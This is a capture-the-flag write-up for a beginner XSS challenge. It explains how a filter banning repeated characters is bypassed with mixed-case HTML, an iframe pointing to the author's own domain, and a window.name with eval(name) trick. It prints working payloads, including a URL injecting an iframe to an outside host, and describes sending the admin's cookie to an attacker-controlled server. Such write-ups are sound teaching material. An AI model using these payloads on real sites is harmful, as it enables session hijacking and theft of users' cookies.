# how2xss

## Description:

> Baby XSS Challenge

## Solution:

After a few tries in the "hack me" page, I realized that the rule for the input is no repeated characters.

First, `alert(1)` can be achieved using the case insensitive property of html: `<svg onLOAd=alert(1)>`.

However, the script to send a cookie is too long. I need to inject more scripts without the limitation of the filter. To do that, I used iframe with src pointing to my own domain.

Since iframe points to a different domain, it cannot access it's parent's cookie. Therefore, I need a second payload to steal the cookie. The shortest payload possible is `eval(name)`, where `name=document.body.innerHTML`. The repeated characters can be bypassed with html encode and unicode encode.

To get the cookie itself, I first set the iframe window name to be a payload that will send the cookie to another domain. Then, I will redirect it back to the "hack me" page with the `eval(name) payload`. This will evaluate the payload stored in name and steal the cookie.

The following payload can be used to steal my own cookie, but it doesn't work when submitted to admin.

```
https://edu-ctf.kaibro.tw:30678/hackme.php?q=<IFRAME SrC=HtTP:/&#x2f;phym.gq>
```

Actually, documents loaded in the same window use the same `window.name`. All of these document can access it, so if we didn't change `window.name`, it will use the previous page's `window.name` by default. Since this question doesn't restrict the domain to be the same as the question's domain, we can just submitted our own server's url (containing the payload) to the admi, without the need to use iframe.

When the admin access our server, its `document.cookie` will be left on our server's access log.
